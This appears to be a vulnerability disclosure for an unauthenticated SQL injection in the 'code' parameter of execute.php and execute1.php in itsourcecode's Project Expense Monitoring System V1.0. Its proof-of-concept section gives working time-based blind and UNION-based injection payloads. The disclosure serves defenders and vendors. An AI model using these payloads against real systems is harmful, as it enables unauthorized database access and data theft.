# Vendor

itsourcecode

# Product

Project Expense Monitoring System

# version

V1.0

# Download 

https://itsourcecode.com/wp-content/uploads/2021/03/Construction-Management-System-Project-In-PHP-Source-Code.zip

# Vulnerability

SQLi

# Description

Attackers do not need to log in to the backend. They can pass in the code parameter in the execute.php and execute1.php pages and construct special SQL statements to carry out SQLi injection attacks to obtain sensitive data.
<img width="1492" alt="image" src="https://github.com/user-attachments/assets/feaaa556-21b0-439f-a58f-a577843999f5">

# POC
```
Parameter: code (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: code=1' AND (SELECT 3055 FROM (SELECT(SLEEP(5)))qdgV) AND 'wCrt'='wCrt

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: code=1' UNION ALL SELECT NULL,CONCAT(0x717a717071,0x6a5158484166616e41746e696241666561674a53525661626877575a6f426454534d69745359456c,0x71786a7171),NULL,NULL,NULL,NULL,NULL,NULL-- -
```
